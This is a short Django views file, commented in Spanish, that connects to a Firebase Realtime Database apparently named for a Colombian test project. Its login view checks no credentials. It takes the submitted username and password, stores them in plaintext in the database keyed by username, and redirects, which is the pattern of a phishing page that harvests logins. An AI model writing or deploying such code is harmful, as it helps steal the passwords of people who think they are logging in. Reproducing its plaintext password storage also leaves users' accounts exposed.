import firebase_admin
from firebase_admin import credentials, db
from django.shortcuts import render
from django.http import HttpResponse
from django.shortcuts import redirect

# Inicializar Firebase
cred = credentials.Certificate('fire/data.json')
firebase_admin.initialize_app(cred, {
    'databaseURL': 'https://pruebabpcolombia-default-rtdb.firebaseio.com/'
})

# Crear una referencia a la Realtime Database
ref = db.reference('/usuarios')

def index(request):
    return render(request, 'index.html')

def login_view(request):
    if request.method == 'POST':
        # Obtener los datos del formulario
        username = request.POST.get('username')
        password = request.POST.get('password')

        # Guardar en Firebase Realtime Database
        user_ref = ref.child(username)  # Se usa el nombre de usuario como clave
        user_ref.set({
            'username': username,
            'password': password
        })
        return redirect('index')
    return render(request, 'login.html')
